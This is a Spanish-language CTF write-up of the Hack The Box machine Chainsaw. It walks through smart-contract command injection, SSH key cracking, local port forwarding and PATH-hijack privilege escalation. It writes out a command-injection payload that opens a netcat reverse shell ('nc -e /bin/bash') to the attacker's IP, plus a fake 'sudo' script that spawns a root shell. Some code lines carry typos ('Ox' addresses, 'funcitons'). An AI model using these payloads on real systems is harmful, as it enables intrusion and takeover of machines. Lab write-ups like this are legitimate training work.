---
layout: single
title: HTB-Chainsaw
excerpt: "WriteUp con metodología de la máquina Chainsaw."
date: 2021-12-15
classes: wide
header:
  icon: /assets/images/hackthebox.webp
  teaser_home_page: true
  teaser: /assets/images/WriteUps/Chainsaw.png
categories:
  - WriteUps
tags:
  - HTB

---


<center><img src='/assets/images/WriteUps/Chainsaw.png'></center>

IP -> 10.10.10.142

## Nmap
Utilizamos [nmap](/Nmap/) y obtenemos los siguientes resultados.

[Chainsaw Nmap Result](/assets/files/WriteUps/Chainsaw.txt)

## ftp
Entramos como el usuario **anonymous**. 

```bash
ftp> prompt off
ftp> mget *
```

> WeaponizedPing.jpeg
> WeaponizedPing.sol
> address.txt

Vemos unos archivo, al investigarlos ecnontramos un solc, contract, etherium, Solidity smart contract languaje, blockchain... Nos encontramos frente a un **Smart Contract**.
Un **Smart Contract**.

## 9010 (Smart Contract)
Vamos a conectarnos al puerto para ver si tiene algo que ver con el contrato.
```bash
pip3 install web3 ethereum eth
python3
```

```python
from web3 import Web3, eth
import json
address = 'OxC8F3Bff5c04B08553FBb8307e1598A55899b3E0C'
w3 = Web3(Web3.HTTPProvider('http://10.10.10.142:9810'))
w3
w3.eth.accounts # Nos lista direcciónes asi que los tiros van por aqui.
w3.eth.defaultAccount = w3.eth.accounts[0]
json_file = json.loads(open("WeaponizedPing.json", "r").read())
abi = json_file['abi']
contract = w3.eth.contract(address=address, abi=abi)
contract.functions.getDomain().call()
contract.functions.setDomain("10.10.14.10").transact() # Recibimos traza icmp, si suponemos que utliza ping, podemos tratar de ejecutar comandos a nivel de sistema.
contract.functions.setDomain("10.10.14.10; ping -c 3 10.10.14.10").transact() # Tenemos RCE
contract.functions.setDomain("10.10.14.10; nc -e /bin/bash 10.10.14.10 443").transact()
```

# User Pivoting

## OS
```bash
cd /home/administrator
cat chainsaw-emp.csv # Hace referencia a correo electrónicos
netstat -nat # No vemos ninún puerto relaccionado con correos abierto
cd maintain
cat gen.py # No tenemos credenciales y no parece muy útil
cd /home/administrator
ls -lha # Vemos un directorio llamado ipfs, lo buscamos y tiene que ver con compartir archivos
which ipfs # Buscamos en la web documentación para ver que podemos hacer
ipfs refs local # List local references
for i in $(ipfs refs local); do ipfs ls $i; done 2>/dev/null # Listamos información de algunas referencias, vemos claves públicas y otros archivos .eml que suponemos que son claves privadas
ipfs get <ref> # Descargamos la supuesta clave privada para bobby. Vemos una clave en base64 como petición web
```

## ssh
Al decodificar el base64 vemos que está cifrada con contraseña

### ssh2john.py
Con **ssh2john.py** sacamos un hash para crackear localmente

### john + rockyou
Rompemos el hash y obtenemos la contraseña

> User: bobby
> id_rsa
> jackychain

> user.txt

# PrivEsc
## OS
```bash
id
sudo -l
cd projects
ls -l # Vemos un archivo SUID y otro smart contract
cat ChainsawClub.sol # Vemos funciones, un usuario y una contraseña hasheada que buscamos en crackstation pero no la consigue.
netstat -nat # Vemos el puerto 63991 abierto localmente
```

## LPortForwarding
Hacemos un Local Port Forwarding con ssh
```bash
ssh -i id_rsa bobby@10.10.10.142 -L 63991:127.0.0.1:63991
```

Tranferimos los archivos del smart contract a nuestra máquina
## 63991 (Smart Contract)
Con python volvemos a sincronizarnos al smart conrtact.
```python
from web3 import web3, eth
address = 'Ox2096618d8fa76638f1d994c08b2e0D872C394d43'
w3 = Web3(Web3.HTTPProvider('http://127.0.0.1:63991'))
w3
w3.eth.accounts
w3.eth.defaultAccount = w3.eth.accounts[0]
json_file = json.loads(open("ChainsawClub.json", "r").read())
abi = json_file['abi']
contract = w3.eth.contract(abi=abi, address=address)
contract.functions.setUsername('creep33').transact()
# Para la contraseña tenemos que pasarla a md5 primero
import hashlib
hashlib.md5('Mario123'.encode()).hexdigest()
contract.functions.setPassword('305b3a99e93d7aee24ee4b21e84308ed').transact()
```

Probamos a iniciar sesión en el binario, ahora nos deja pero "no estamos aprovados". Miramos más funciones que tenga el smart contract, hay un get/setApprove()
```python
contract.functions.setApprove(True).transact()
```

Ahora no tenemos dinero, vamos a ver funciones, getBalance, transfer
```python
contract.functions.transfer(1000).transact()
contract.funcitons.getBalance().call()
```

Al iniciar sesión somos root.

# PrivEsc (Altway)
## OS
```bash
strings ChainsawClub
```

Vemos que ejecuta un archivo que se encuentra en la ruta de /root, pero utiliza sudo de forma relativa.

## Path Hijacking
```bash
cd /tmp
echo "bash -p" > sudo
export PATH=/tmp:$PATH
./ChainsawClub
```

Y seríamos root

# root.txt
Al intentar abrir el root.txt nos dice:

> Mine deeper to get rearded with root coin (RTC)...

Buscamos en san-google "hidding data with files" y en la última referencia de la seguna página encontramos como hacerlo.
Con **bmap** podemos utilizar la memoria reservada pero no utilizada para un archivo.

```bash
bmap --mode slack root.txt
```

> root.txt
